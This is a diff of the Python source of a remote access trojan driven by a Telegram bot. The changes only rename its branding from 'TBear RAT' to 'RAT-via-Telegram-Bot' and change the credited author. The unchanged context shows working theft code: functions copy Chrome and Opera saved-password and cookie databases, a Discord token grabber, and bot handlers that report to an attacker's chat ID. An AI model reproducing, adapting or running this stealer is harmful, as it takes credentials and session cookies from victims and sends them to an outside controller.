@@ -25,7 +25,7 @@ bot = telebot.TeleBot(bot_token)
 
 
 def Chrome():
-    text = 'TBear RAT | coded by nilkar\n\n\nPasswords Chrome:' + '\n'
+    text = 'coded by romarakhlin\n\n\nPasswords Chrome:' + '\n'
     if os.path.exists(os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
         shutil.copy2(os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default\\Login Data', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
         
@@ -44,7 +44,7 @@ file.write(str(Chrome()) + '\n')
 file.close()
 
 def Chrome_cockie():
-   textc = 'TBear RAT | coded by nilkar\n\n\nCookies Chrome:' + '\n'
+   textc = 'coded by romarakhlin\n\n\nCookies Chrome:' + '\n'
    textc += 'URL | COOKIE | COOKIE NAME' + '\n'
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
@@ -62,7 +62,7 @@ file.write(str(Chrome_cockie()) + '\n')
 file.close()
 
 def Opera():
-    texto = 'TBear RAT | coded by nilkar\n\n\nPasswords Opera:' + '\n'
+    texto = 'coded by romarakhlin\n\n\nPasswords Opera:' + '\n'
     texto += 'URL | LOGIN | PASSWORD' + '\n'
     if os.path.exists(os.getenv('APPDATA') + '\\Opera Software\\Opera Stable\\Login Data'):
         shutil.copy2(os.getenv('APPDATA') + '\\Opera Software\\Opera Stable\\Login Data', os.getenv('APPDATA') + '\\Opera Software\\Opera Stable\\Login Data2')
@@ -80,7 +80,7 @@ file.write(str(Opera()) + '\n')
 file.close()
 
 def Opera_cockie():
-    textoc = 'TBear RAT | coded by nilkar\n\n\nCookies Opera:' + '\n'
+    textoc = 'coded by romarakhlin\n\n\nCookies Opera:' + '\n'
     textoc += 'URL | COOKIE | COOKIE NAME' + '\n'
     if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies'):
       shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies', os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Cookies2')
@@ -118,7 +118,7 @@ ds_token  = 'Discord token:' + '\n' + discord_token() + '\n' + '\n'
 
 @bot.message_handler(commands=['start'])
 def send_message(command):
-    bot.send_message(chat_id, '🐻 TBear RAT 🐻' +
+    bot.send_message(chat_id, '' +
                      '\n\nTo know all commands: ' + '\n/commands ' + '\nTo know about TBear RAT: ' + '\n/help', reply_markup=keyboard())
 
 def keyboard():
@@ -131,7 +131,7 @@ def keyboard():
 
 @bot.message_handler(commands=['help'])
 def send_message(command):
-    bot.send_message(chat_id, '🐻 TBear RAT 🐻' + '\n\nCoded by nilkar' + '\nback - /start')
+    bot.send_message(chat_id, 'RAT-via-Telegram-Bot' + '\n\nCoded by romarakhlin' + '\nback - /start')
 
 @bot.message_handler(commands=['commands'])
 def send_message(command):
@@ -287,7 +287,7 @@ def delete_dir(message):
 
 @bot.message_handler(commands = ['about'])
 def about(commands):
-    bot.send_message(chat_id, '🐻 TBear RAT 🐻' + '\nCoded by nilkar')
+    bot.send_message(chat_id, 'RAT-via-Telegram-Bot' + '\nCoded by nilkar')
 
 bot.polling()
 
